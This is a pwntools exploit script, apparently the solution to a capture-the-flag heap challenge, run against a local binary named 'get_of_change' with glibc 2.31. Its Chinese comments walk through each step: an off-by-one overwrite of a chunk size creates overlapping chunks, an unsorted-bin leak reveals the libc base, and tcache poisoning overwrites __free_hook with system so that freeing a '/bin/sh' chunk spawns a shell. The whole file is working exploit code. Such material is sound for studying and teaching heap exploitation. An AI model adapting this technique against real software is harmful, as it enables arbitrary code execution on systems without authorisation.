```
from pwn import *

context(log_level='debug', os='linux', arch='amd64')

p = process('/home/kali/Desktop/get_of_change')
elf = ELF('/home/kali/Desktop/get_of_change')
libc = ELF('/home/kali/Desktop/libc/libc-2.31.so')

menu = b"Your Choice: "


def add(size, data):
    p.sendlineafter(menu, b"1")
    p.sendlineafter(b"size: \n", str(size).encode())
    p.sendafter(b"content: \n", data)


def show(idx):
    p.sendlineafter(menu, b'2')
    p.sendlineafter(b"idx: \n", str(idx).encode())


def delete(idx):
    p.sendlineafter(menu, b'3')
    p.sendlineafter(b"idx: \n", str(idx).encode())


for _ in range(13):
    add(0x68, b'X')  # 0-12

delete(0)   # 放入tcachebin
add(0x68, b'X' * 0x68 + p8(0x81))  # 13 覆盖掉下一个chunk的size
delete(1)   # 释放那个size被改为0x81的chunk
add(0x78, b'X' * 0x68 + p64(0x461))  # 14 将下一个chunk的chunk头改为较大的size时期属于unsortedbin，但是根上边的第12个chunk对其绕过检查， 
delete(2)   # 释放size为0x461的chunk，为fd，bk为main_arena+88
add(0x10, b'X')  # 15 2     从unsortedbin中连续分配两个chunk
add(0x10, b'X')  # 16
show(15)        # 由于未清空旧的数据，libc基址泄露

# 获取system，__free_hook地址
p.recvuntil(b"the content: \n") 

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecf58
system = libc.sym["system"]

__free_hook = libc.sym["__free_hook"]
info("libc.address-->" + hex(libc.address))

delete(16)  # 释放最后一个chunk到tcachebin
delete(15)  # 释放倒数第二个chunk到tcachebin,tcachebin的操作是在头部进行的，所以tcachebin->倒数第二个chunk->最后一个chunk

delete(14)  # 释放那个0x80大小的chunk
add(0x78, b'X' * 0x68 + p64(0x21) + p64(__free_hook))  # 17 重新申请获取这个chunk，并将倒数第二个chunk的指针改写为__free_hook的地址，tcachebin->倒数第二个chunk->__free_hook
add(0x10, b'/bin/sh\x00')  # 18 15  将倒数第二个chunk的用户地址改为cmd，tcachebin->__free_hook
add(0x10, p64(system))  # 19    将__free_hook改写为system
delete(18)  # 调用__free_hook时将chunk18的地址作为参数，指向的字符串为/bin/sh

gdb.attach(p,'heap')
p.interactive()
```
